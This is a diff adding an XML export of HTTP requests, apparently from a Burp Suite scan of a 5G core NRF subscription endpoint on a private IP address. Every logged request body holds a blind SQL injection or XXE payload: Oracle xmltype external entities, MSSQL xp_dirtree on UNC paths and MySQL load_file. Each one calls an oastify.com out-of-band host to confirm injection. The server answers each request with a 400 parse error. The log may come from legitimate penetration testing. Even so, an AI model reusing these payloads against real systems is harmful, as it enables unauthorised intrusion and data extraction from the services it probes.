@@ -1,0 +1,203 @@
+<items exportTime="Sat Feb 18 23:52:09 CET 2023">
+  <item>
+    <time>Sat Feb 18 23:17:55 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/subscriptions]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/subscriptions]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[POST /nnrf-nfm/v1/subscriptions HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+Content-Length: 204
+
+(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % uqwds SYSTEM "http://uljc1erswo9wbgrwy9mqmubf86excl295xwoje73.oasti'||'fy.com/">%uqwds;]>'),'/l') from dual)]]></request>
+    <status>400</status>
+    <responselength>200</responselength>
+    <mimetype>script</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 400 Bad Request
+Connection: Close
+Content-Length: 132
+
+[json.exception.parse_error.101] parse error at line 1, column 1: syntax error while parsing value - invalid literal; last read: '(']]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sat Feb 18 23:17:56 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/subscriptions]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/subscriptions]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[POST /nnrf-nfm/v1/subscriptions HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+Content-Length: 690
+
+
+{'reqNotifEvents': 'value', 'validityTime': 'value', 'reqNfFqdn': 'value', 'reqNfInstanceId': 'value', 'nid': 'value', 'notifCondition': 'value', 'reqPlmnList': 'value', 'reqSnssais': 'value', 'reqPerPlmnSnssais': 'value', 'reqSnpnList': 'value', 'nfStatusNotificationUri': 'required_value', 'plmnId': 'value', 'requesterFeatures': 'value', 'servingScope': 'value', 'subscriptionId': 'required_value', 'subscrCond': 'value', 'reqNfType': 'value', 'nrfSupportedFeatures': 'value'}'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % uqwds SYSTEM "http://4dimtoj2oy163qj6qje0e43p0g674vujy7pyco0d.oasti'||'fy.com/">%uqwds;]>'),'/l') from dual)||']]></request>
+    <status>400</status>
+    <responselength>239</responselength>
+    <mimetype>text</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 400 Bad Request
+Connection: Close
+Content-Length: 171
+
+[json.exception.parse_error.101] parse error at line 2, column 2: syntax error while parsing object key - invalid literal; last read: '<U+000A>{''; expected string literal]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sat Feb 18 23:17:57 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/subscriptions]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/subscriptions]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[POST /nnrf-nfm/v1/subscriptions HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+Content-Length: 610
+
+
+{'reqNotifEvents': 'value', 'validityTime': 'value', 'reqNfFqdn': 'value', 'reqNfInstanceId': 'value', 'nid': 'value', 'notifCondition': 'value', 'reqPlmnList': 'value', 'reqSnssais': 'value', 'reqPerPlmnSnssais': 'value', 'reqSnpnList': 'value', 'nfStatusNotificationUri': 'required_value', 'plmnId': 'value', 'requesterFeatures': 'value', 'servingScope': 'value', 'subscriptionId': 'required_value', 'subscrCond': 'value', 'reqNfType': 'value', 'nrfSupportedFeatures': 'value'};declare @q varchar(99);set @q='\\f1hxhz7dc9phr17heu2b2fr0oruis6iu9kxboyem3.oasti'+'fy.com\wwk'; exec master.dbo.xp_dirtree @q;-- ]]></request>
+    <status>400</status>
+    <responselength>239</responselength>
+    <mimetype>text</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 400 Bad Request
+Connection: Close
+Content-Length: 171
+
+[json.exception.parse_error.101] parse error at line 2, column 2: syntax error while parsing object key - invalid literal; last read: '<U+000A>{''; expected string literal]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sat Feb 18 23:17:58 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/subscriptions]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/subscriptions]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[POST /nnrf-nfm/v1/subscriptions HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+Content-Length: 611
+
+
+{'reqNotifEvents': 'value', 'validityTime': 'value', 'reqNfFqdn': 'value', 'reqNfInstanceId': 'value', 'nid': 'value', 'notifCondition': 'value', 'reqPlmnList': 'value', 'reqSnssais': 'value', 'reqPerPlmnSnssais': 'value', 'reqSnpnList': 'value', 'nfStatusNotificationUri': 'required_value', 'plmnId': 'value', 'requesterFeatures': 'value', 'servingScope': 'value', 'subscriptionId': 'required_value', 'subscrCond': 'value', 'reqNfType': 'value', 'nrfSupportedFeatures': 'value'}';declare @q varchar(99);set @q='\\qga8wamork4s6cmst5hmhq6b329t7hx5owcn3atyi.oasti'+'fy.com\kvf'; exec master.dbo.xp_dirtree @q;-- ]]></request>
+    <status>400</status>
+    <responselength>239</responselength>
+    <mimetype>text</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 400 Bad Request
+Connection: Close
+Content-Length: 171
+
+[json.exception.parse_error.101] parse error at line 2, column 2: syntax error while parsing object key - invalid literal; last read: '<U+000A>{''; expected string literal]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sat Feb 18 23:17:59 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/subscriptions]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/subscriptions]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[POST /nnrf-nfm/v1/subscriptions HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+Content-Length: 611
+
+
+{'reqNotifEvents': 'value', 'validityTime': 'value', 'reqNfFqdn': 'value', 'reqNfInstanceId': 'value', 'nid': 'value', 'notifCondition': 'value', 'reqPlmnList': 'value', 'reqSnssais': 'value', 'reqPerPlmnSnssais': 'value', 'reqSnpnList': 'value', 'nfStatusNotificationUri': 'required_value', 'plmnId': 'value', 'requesterFeatures': 'value', 'servingScope': 'value', 'subscriptionId': 'required_value', 'subscrCond': 'value', 'reqNfType': 'value', 'nrfSupportedFeatures': 'value'});declare @q varchar(99);set @q='\\ej1wzypcu87g90pgwtkake9z6qcha50trlfc6zwnl.oasti'+'fy.com\fft'; exec master.dbo.xp_dirtree @q;-- ]]></request>
+    <status>400</status>
+    <responselength>239</responselength>
+    <mimetype>text</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 400 Bad Request
+Connection: Close
+Content-Length: 171
+
+[json.exception.parse_error.101] parse error at line 2, column 2: syntax error while parsing object key - invalid literal; last read: '<U+000A>{''; expected string literal]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sat Feb 18 23:18:00 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/subscriptions]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/subscriptions]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[POST /nnrf-nfm/v1/subscriptions HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+Content-Length: 612
+
+
+{'reqNotifEvents': 'value', 'validityTime': 'value', 'reqNfFqdn': 'value', 'reqNfInstanceId': 'value', 'nid': 'value', 'notifCondition': 'value', 'reqPlmnList': 'value', 'reqSnssais': 'value', 'reqPerPlmnSnssais': 'value', 'reqSnpnList': 'value', 'nfStatusNotificationUri': 'required_value', 'plmnId': 'value', 'requesterFeatures': 'value', 'servingScope': 'value', 'subscriptionId': 'required_value', 'subscrCond': 'value', 'reqNfType': 'value', 'nrfSupportedFeatures': 'value'}');declare @q varchar(99);set @q='\\1cejsliznv032ni3pgdxd12mzd543stgk980znpbe.oasti'+'fy.com\dix'; exec master.dbo.xp_dirtree @q;-- ]]></request>
+    <status>400</status>
+    <responselength>239</responselength>
+    <mimetype>text</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 400 Bad Request
+Connection: Close
+Content-Length: 171
+
+[json.exception.parse_error.101] parse error at line 2, column 2: syntax error while parsing object key - invalid literal; last read: '<U+000A>{''; expected string literal]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sat Feb 18 23:18:01 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/subscriptions]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[POST]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/subscriptions]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[POST /nnrf-nfm/v1/subscriptions HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+Content-Encoding: gzip, deflate
+Accept-Encoding: gzip, deflate
+Content-Length: 84
+
+(select load_file('\\\\9u4rat0753ibkv0b7ov5v9kuhlncl0bo2qqhh47sw.oastify.com\\kxu'))]]></request>
+    <status>400</status>
+    <responselength>200</responselength>
+    <mimetype>script</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 400 Bad Request
+Connection: Close
+Content-Length: 132
+
+[json.exception.parse_error.101] parse error at line 1, column 1: syntax error while parsing value - invalid literal; last read: '(']]></response>
+    <comment></comment>
+  </item>
+</items>
